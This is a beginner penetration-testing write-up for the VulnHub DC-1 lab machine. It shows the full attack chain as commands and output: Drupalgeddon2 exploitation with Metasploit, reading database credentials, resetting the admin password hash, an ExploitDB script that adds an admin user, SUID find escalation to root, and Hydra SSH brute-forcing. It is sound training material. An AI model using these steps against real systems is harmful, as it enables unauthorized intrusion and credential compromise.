# 🛡️ VulnHub DC-1 Lab

> **Platform:** VulnHub | **Difficulty:** Beginner | **Flags:** 5 | **Goal:** Root the machine

![Platform](https://img.shields.io/badge/Platform-VulnHub-blue?style=flat-square&logo=linux)
![Difficulty](https://img.shields.io/badge/Difficulty-Beginner-brightgreen?style=flat-square)
![Flags](https://img.shields.io/badge/Flags-5%20%2F%205-success?style=flat-square)
![CMS](https://img.shields.io/badge/CMS-Drupal%207-informational?style=flat-square&logo=drupal)
![CVE](https://img.shields.io/badge/CVE-2018--7600-critical?style=flat-square)
![Tools](https://img.shields.io/badge/Tools-Metasploit%20%7C%20Hydra%20%7C%20Nmap-orange?style=flat-square)

---

## 📖 About

This is my personal writeup for the **DC: 1** machine on VulnHub: a beginner-friendly intentionally vulnerable lab designed for penetration testing practice.

The machine runs a **Drupal 7 CMS** vulnerable to **CVE-2018-7600 (Drupalgeddon2)**, allowing unauthenticated remote code execution. From there, the path to root involves database credential extraction, admin password reset, privilege escalation via SUID `find`, and SSH brute-forcing with Hydra.

This writeup walks through each step in detail, including two methods for each major stage where alternatives exist.

- 🔗 **Machine Page:** https://www.vulnhub.com/entry/dc-1-1,292/
- 📦 **Download:** https://download.vulnhub.com/dc/DC-1.zip
- 👤 **Machine Author:** DCAU
- 📅 **Writeup Date:** April 2026

---

## ⚙️ Environment Setup

| Component | Setting |
|-----------|---------|
| Hypervisor | VMware Workstation |
| Network Mode | NAT |
| RAM | 1 GB |
| Disk | 4 GB |
| Attacker OS | Kali Linux |

> Both the target VM and Kali must be on the same LAN segment for communication.

---

## 🗺️ Attack Overview

```
[Recon] → [CMS Fingerprint] → [Exploit CVE-2018-7600] → [Shell]
   → [flag1 & flag2] → [DB Creds] → [Reset Admin PW] → [flag3]
   → [/etc/passwd] → [flag4] → [SUID PrivEsc / Hydra] → [flag5 🏆]
```

---

## 🔍 Phase 1: Information Gathering

### Target Discovery

```bash
# Method 1: ARP scan
arp-scan -l

# Method 2: Netdiscover
netdiscover -i eth0
# Result → 192.168.44.144
```

### Port Scanning

```bash
nmap -sS -T4 -A -p- 192.168.44.144
```

| Port | Service | Notes |
|------|---------|-------|
| 22 | SSH | OpenSSH 6.0p1 Debian |
| 80 | HTTP | Apache 2.2.22: **Drupal Site** |
| 111 | RPCBind |: |
| 45684 | Unknown | Sensitive port |

---

## 🌐 Phase 2: CMS Vulnerability Search

Browsing to `http://192.168.44.144` reveals a **Drupal** site. Confirmed via the **Wappalyzer** browser plugin (Drupal 7, PHP 5.4.45, Apache, Debian, jQuery 1.4.4).

```
CVE: CVE-2018-7600  (Drupalgeddon2)
CVSS: 9.8 CRITICAL
Vector: Network / No Auth Required / RCE
```

---

## 💥 Phase 3: Metasploit Exploitation

```bash
# Start Metasploit
msfconsole

# Search for Drupal modules
search drupal

# Load the exploit
use exploit/unix/webapp/drupal_drupalgeddon2
show options

# Set target and fire
set RHOSTS 192.168.44.144
exploit

# Drop into a shell
shell
ls
```

---

## 🚩 Phase 4: Flag 1 & Flag 2 (Sensitive File Analysis)

```bash
# Read flag1
cat flag1.txt
# → "Every good CMS needs a config file - and so do you."

# Spawn an interactive TTY
python -c 'import pty;pty.spawn("/bin/bash")'

# Check the Drupal DB config file for flag2
cat /var/www/sites/default/settings.php
```

**flag2** is embedded in the config file comment, alongside plaintext DB credentials:

```php
# flag2 hint: "Brute force and dictionary attacks aren't the only ways..."

'database' => 'drupaldb',
'username' => 'dbuser',
'password' => 'R0ck3t',
```

---

## 🗄️ Phase 5: Database Enumeration

```bash
mysql -u dbuser -p
# Password: R0ck3t

use drupaldb;
show tables;

select name,pass from users;
```

| User | Password Hash |
|------|---------------|
| admin | `$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR` |
| Fred | `$S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg` |

> Drupal 7 uses salted MD5: standard MD5 cracking won't work here.

---

## 🚩 Phase 6: Admin Password Reset → Flag 3

### Method A: PHP Hash Script

```bash
# Generate new hash for password "123456"
php scripts/password-hash.sh 123456
# → hash: $S$DQrmfkgP1s7S3svvp/OdzHuGpZyt0oaIOIMuULnN6Zo.gxuq8MAu

# Re-enter MySQL and update
mysql -u dbuser -p
use drupaldb;
update users set pass='$S$DQrmfkgP1s7S3svvp/OdzHuGpZyt0oaIOIMuULnN6Zo.gxuq8MAu' where name='admin';
```

Login at `http://192.168.44.144` → admin / 123456 → navigate to Content → **flag3**.

> 🔑 **flag3 hint:** "Special PERMS will help FIND the passwd: you'll need to `-exec` that command to work out what's in the shadow."

### Method B: ExploitDB Script (Add New Admin)

```bash
# Check Drupal version
cat /var/www/includes/bootstrap.inc | grep VERSION
# → 7.24

# Find applicable exploit
searchsploit drupal

# Add admin user via exploit (works on < 7.31)
python /usr/share/exploitdb/exploits/php/webapps/34992.py \
  -t http://192.168.44.144 \
  -u eastmount \
  -p eastmount
```

---

## 🚩 Phase 7: User Enumeration → Flag 4

```bash
cat /etc/passwd
# Reveals: flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash

cd /home/flag4
cat flag4.txt
# → "Can you use this same method to find or access the flag in root?"
```

---

## ⬆️ Phase 8: Privilege Escalation → Flag 5

### SUID find PrivEsc

```bash
# Find SUID binaries owned by root
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Confirm find is SUID root
cd /usr/bin && ls -l find
# → -rwsr-xr-x 1 root root 162424 find

# Escalate to root shell
mkdir test
find test -exec '/bin/sh' \;
whoami
# → root

# Read the final flag
find test -exec cat /root/thefinalflag.txt \;
# → "Well done!!!! Hopefully you've enjoyed this..."
```

### Hydra SSH Brute-Force (Alternate Path)

```bash
# Read shadow for hash info
cat /etc/shadow   # flag4 user has crackable hash

# Brute-force SSH login for flag4
hydra -l flag4 -P passwords.txt ssh://192.168.44.144
# Result → login: flag4 | password: orange

# SSH in as flag4
ssh flag4@192.168.44.144
# Password: orange

# Navigate to root and read final flag
cd /root
cat thefinalflag.txt
```

---

## 📊 Flags Summary

| # | Location | Hint Leads To |
|---|----------|---------------|
| 🚩 Flag 1 | `/var/www/flag1.txt` | Check the CMS config file |
| 🚩 Flag 2 | `/var/www/sites/default/settings.php` | DB credentials |
| 🚩 Flag 3 | Drupal admin content panel | Use `-exec` with `find` |
| 🚩 Flag 4 | `/home/flag4/flag4.txt` | Root directory |
| 🏆 Flag 5 | `/root/thefinalflag.txt` | **Game Over** |

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| `arp-scan` / `netdiscover` | Host discovery |
| `nmap` | Port & service scanning |
| `Wappalyzer` | CMS fingerprinting |
| `Metasploit` | CVE-2018-7600 exploitation |
| `MySQL` | Database enumeration |
| `Hydra` | SSH brute-force |
| `find` + SUID | Privilege escalation |
| `Python pty` | Interactive shell upgrade |

---

## 📚 References

- [VulnHub DC-1 Machine Page](https://www.vulnhub.com/entry/dc-1-1,292/)
- [Drupalgeddon2 CVE-2018-7600](https://www.exploit-db.com/exploits/44449)
- [How to reset Drupal 7 passwords](https://www.drupal.org/node/44164)

---

## ⚠️ Disclaimer

> This writeup is for **educational purposes only**. All testing was performed in an isolated lab environment on intentionally vulnerable machines. Never attempt these techniques on systems you do not own or have explicit permission to test.

---

## 🏷️ Tags

`ctf` `vulnhub` `penetration-testing` `drupal` `cve-2018-7600` `metasploit` `privilege-escalation` `suid` `hydra` `kali-linux` `web-security` `writeup` `beginner` `linux`
